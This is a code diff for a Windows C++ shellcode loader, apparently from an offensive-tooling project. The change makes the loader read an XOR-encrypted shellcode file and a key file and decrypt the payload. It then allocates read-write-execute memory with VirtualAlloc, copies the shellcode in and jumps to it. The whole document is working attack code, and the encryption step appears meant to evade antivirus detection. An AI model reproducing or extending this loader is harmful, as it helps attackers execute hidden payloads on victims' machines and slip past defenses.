@@ -1,14 +1,15 @@
 #include <windows.h>
 #include <iostream>
-#include <fstream>
+#include "../shared/futils.hpp"
+#include "../shared/crypto.hpp"
 
 #define VERBOSE 1
 
 int main(int argc, char **argv)
 {
-    if (argc != 2)
+    if (argc != 3)
     {
-        std::cout << "[?] Usage: " << argv[0] << " <shellcode-path>" << std::endl;
+        std::cout << "[?] Usage: " << argv[0] << " <shellcode-path> <xor-keyfile-path>" << std::endl;
         return 1;
     }
 
@@ -16,41 +17,40 @@ int main(int argc, char **argv)
     std::cout << "[+] Reading shellcode from " << argv[1] << std::endl;
 #endif
 
-    std::ifstream shellcode(argv[1]);
+    auto shellcodeContents = ReadFromFile(argv[1]);
 
-    if (!shellcode.is_open())
-    {
-        std::cout << "[!] Failed to open " << argv[1] << std::endl;
-        return 1;
-    }
+#ifdef VERBOSE
+    std::cout << "[+] Reading XOR key from " << argv[2] << std::endl;
+#endif
 
-    shellcode.seekg(0, std::ios::end);
-    size_t filesize = shellcode.tellg();
-    shellcode.seekg(0, std::ios::beg);
+    auto key = ReadFromFile(argv[2]);
 
-    auto buffer = new char[filesize];
-    shellcode.read(buffer, filesize);
+#ifdef VERBOSE
+    std::cout << "[+] XOR'ing shellcode" << std::endl;
+#endif
 
-    auto base = VirtualAlloc(nullptr, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    XorCipher(shellcodeContents, key);
 
-    if (!base)
+    auto baseAddress = VirtualAlloc(nullptr, shellcodeContents.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (!baseAddress)
     {
         std::cout << "[!] Failed to allocate memory" << std::endl;
         return 1;
     }
 
 #ifdef VERBOSE
-    std::cout << "[+] Allocated " << filesize << " bytes at " << base << std::endl;
+    std::cout << "[+] Allocated " << shellcodeContents.size() << " bytes at " << baseAddress << std::endl;
 #endif
 
-    std::copy(buffer, buffer + filesize, static_cast<char *>(base));
+    std::copy(shellcodeContents.begin(), shellcodeContents.end(), static_cast<char *>(baseAddress));
 
 #ifdef VERBOSE
-    std::cout << "[+] Copied shellcode to " << base << std::endl;
-    std::cout << "[+] Executing 'jmp " << base << "'" << std::endl;
+    std::cout << "[+] Copied shellcode to " << baseAddress << std::endl;
+    std::cout << "[+] Executing 'jmp " << baseAddress << "'" << std::endl;
 #endif
 
-    __asm__("jmp *%0" ::"r"(base));
+    __asm__("jmp *%0" ::"r"(baseAddress));
 
     return 0;
 }
